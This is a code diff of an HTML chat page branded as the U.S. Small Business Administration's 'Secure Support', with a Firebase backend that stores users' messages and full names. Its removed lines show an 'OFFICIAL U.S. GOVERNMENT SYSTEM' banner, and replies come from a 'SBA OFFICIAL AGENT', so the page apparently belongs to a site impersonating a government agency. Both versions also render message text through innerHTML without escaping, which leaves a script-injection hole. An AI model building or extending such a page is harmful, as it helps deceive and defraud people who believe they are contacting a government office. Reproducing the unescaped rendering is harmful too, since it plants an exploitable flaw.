@@ -3,80 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Secure Message Center</title>
+    <title>SBA | Secure Support</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .msg-bubble {
-            max-width: 85%;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 13px;
-            line-height: 1.5;
-            position: relative;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            margin-bottom: 2px;
-        }
-        .msg-user {
-            align-self: flex-end;
-            background: #1e3a8a; 
-            color: white;
-            border-bottom-right-radius: 2px;
-        }
-        .msg-admin {
-            align-self: flex-start;
-            background: #ffffff;
-            color: #1e293b;
-            border: 1px solid #e2e8f0;
-            border-bottom-left-radius: 2px;
-        }
-        .msg-meta {
-            font-size: 8px;
-            color: #94a3b8;
-            margin-top: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
         #chatBox { 
-            scroll-behavior: smooth; 
             display: flex; 
-            flex-direction: column;
-            gap: 5px;
+            flex-direction: column; 
+            gap: 12px; 
+            padding: 15px; 
+            height: 400px; 
+            overflow-y: auto; 
+            background: #f8fafc;
+            border-radius: 8px;
         }
-        #chatBox::-webkit-scrollbar { width: 4px; }
-        #chatBox::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        .msg-wrapper { display: flex; flex-direction: column; width: 100%; }
+        .msg-bubble { 
+            max-width: 80%; 
+            padding: 12px; 
+            font-size: 14px; 
+            line-height: 1.4; 
+            word-wrap: break-word; 
+        }
+        .user-side { align-self: flex-end; background: #1e3a8a; color: white; border-radius: 15px 15px 0 15px; }
+        .admin-side { align-self: flex-start; background: #ffffff; color: #1e293b; border: 1px solid #cbd5e1; border-radius: 15px 15px 15px 0; }
+        .meta { font-size: 9px; color: #94a3b8; margin-top: 4px; font-weight: bold; }
     </style>
 </head>
-<body style="background: #f1f5f9;">
-
-    <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+<body style="background: #f1f5f9; margin:0;">
+    <div class="nav" style="background: #1e3a8a; padding: 15px; color: white; display: flex; justify-content: space-between;">
+        <span style="font-weight: bold;">SBA.GOV SUPPORT</span>
+        <button onclick="location.href='dashboard.html'" style="background:none; border:1px solid white; color:white; padding:4px 10px; border-radius:4px;">BACK</button>
     </div>
 
-    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #1e3a8a;">
-        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid white; border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
-            BACK
-        </button>
-    </div>
-
-    <div class="container">
-        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
-            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
-                <div style="width: 10px; height: 10px; background: #10b981; border-radius: 50%;"></div>
-                <h2 style="color: #1e3a8a; font-size: 18px; margin: 0;">Secure Support</h2>
-            </div>
-
-            <div id="chatBox" style="background:#f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 12px; height: 400px; overflow-y: auto; margin-bottom: 15px;">
-                </div>
-
-            <textarea id="userMsg" style="height:70px; width: 100%; border-radius: 10px; padding: 12px; border: 1px solid #cbd5e1; font-family: inherit; resize: none; box-sizing: border-box; font-size: 14px;" placeholder="Type your message..."></textarea>
-            
-            <button id="sendBtn" style="background: #1e3a8a; color: white; padding: 14px; border-radius: 10px; width: 100%; font-weight: 800; border: none; margin-top: 10px; cursor: pointer; text-transform: uppercase;">
-                Send Message
-            </button>
+    <div class="container" style="max-width: 500px; margin: 20px auto; padding: 0 10px;">
+        <div style="background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+            <div id="chatBox"></div>
+            <textarea id="userMsg" style="width: 100%; margin-top: 15px; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; box-sizing: border-box; height: 80px; resize: none;" placeholder="How can we help?"></textarea>
+            <button id="sendBtn" style="width: 100%; background: #1e3a8a; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; margin-top: 10px;">SEND MESSAGE</button>
         </div>
     </div>
 
@@ -98,95 +61,42 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        const chatBox = document.getElementById('chatBox');
-        const userMsg = document.getElementById('userMsg');
-        const sendBtn = document.getElementById('sendBtn');
-
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                // FIXED QUERY: No 'orderBy' here to prevent Firebase Indexing errors
-                const q = query(
-                    collection(db, "support_tickets"), 
-                    where("userId", "==", user.uid)
-                );
-
+                const q = query(collection(db, "support_tickets"), where("userId", "==", user.uid));
                 onSnapshot(q, (snapshot) => {
-                    chatBox.innerHTML = `
-                        <div style="align-self: flex-start; width: 100%;">
-                            <div class="msg-bubble msg-admin">
-                                <b style="color: #1e3a8a; font-size: 10px; display: block; margin-bottom: 4px;">SYSTEM</b>
-                                Encrypted channel active. You are now connected to SBA Case Management.
-                            </div>
-                            <div class="msg-meta">SECURE_SESSION_START</div>
-                        </div>
-                    `;
-
-                    // MANUAL SORTING: Sort docs by time after receiving them
-                    const sortedDocs = snapshot.docs.sort((a, b) => {
-                        const timeA = a.data().timestamp?.toMillis() || 0;
-                        const timeB = b.data().timestamp?.toMillis() || 0;
-                        return timeA - timeB;
-                    });
-
-                    sortedDocs.forEach((snapDoc) => {
-                        const m = snapDoc.data();
-                        const isUser = m.sender === "USER";
-                        
-                        const msgWrapper = document.createElement('div');
-                        msgWrapper.style.display = "flex";
-                        msgWrapper.style.flexDirection = "column";
-                        msgWrapper.style.width = "100%";
-                        msgWrapper.style.alignItems = isUser ? "flex-end" : "flex-start";
-
-                        msgWrapper.innerHTML = `
-                            <div class="msg-bubble ${isUser ? 'msg-user' : 'msg-admin'}">
-                                ${!isUser ? `<b style="color: #ba0c2f; font-size: 10px; display: block; margin-bottom: 4px;">SBA OFFICIAL AGENT</b>` : ''}
-                                ${m.message}
-                            </div>
-                            <div class="msg-meta" style="text-align: ${isUser ? 'right' : 'left'}">
-                                ${isUser ? 'SENT' : 'RECEIVED'}
-                            </div>
-                        `;
-                        chatBox.appendChild(msgWrapper);
-                    });
+                    const chatBox = document.getElementById('chatBox');
+                    chatBox.innerHTML = "";
                     
-                    // Force scroll to bottom
+                    const sorted = snapshot.docs.sort((a, b) => (a.data().timestamp?.toMillis() || 0) - (b.data().timestamp?.toMillis() || 0));
+
+                    sorted.forEach(snap => {
+                        const m = snap.data();
+                        const isUser = m.sender === "USER";
+                        chatBox.innerHTML += `
+                            <div class="msg-wrapper" style="align-items: ${isUser ? 'flex-end' : 'flex-start'};">
+                                <div class="msg-bubble ${isUser ? 'user-side' : 'admin-side'}">
+                                    ${!isUser ? '<b style="font-size:10px; display:block; color:#ba0c2f;">SBA AGENT</b>' : ''}
+                                    ${m.message}
+                                </div>
+                                <div class="meta">${isUser ? 'SENT' : 'RECEIVED'}</div>
+                            </div>`;
+                    });
                     chatBox.scrollTop = chatBox.scrollHeight;
                 });
-            } else {
-                window.location.href = 'index.html';
-            }
+            } else { window.location.href = "index.html"; }
         });
 
-        sendBtn.onclick = async () => {
-            const text = userMsg.value.trim();
+        document.getElementById('sendBtn').onclick = async () => {
+            const input = document.getElementById('userMsg');
+            if(!input.value.trim()) return;
             const user = auth.currentUser;
-
-            if(!text || !user) return;
-
-            sendBtn.disabled = true;
-            sendBtn.innerText = "SENDING...";
-
-            try {
-                const userSnap = await getDoc(doc(db, "users", user.uid));
-                const fullName = userSnap.data()?.fullName || "User";
-
-                await addDoc(collection(db, "support_tickets"), {
-                    userId: user.uid,
-                    userName: fullName,
-                    message: text,
-                    sender: "USER",
-                    timestamp: serverTimestamp()
-                });
-
-                userMsg.value = "";
-            } catch (e) {
-                console.error("Error sending message:", e);
-                alert("Connection lost. Please try again.");
-            } finally {
-                sendBtn.disabled = false;
-                sendBtn.innerText = "SEND MESSAGE";
-            }
+            const userSnap = await getDoc(doc(db, "users", user.uid));
+            await addDoc(collection(db, "support_tickets"), {
+                userId: user.uid, userName: userSnap.data()?.fullName || "User",
+                message: input.value.trim(), sender: "USER", timestamp: serverTimestamp()
+            });
+            input.value = "";
         };
     </script>
 </body>
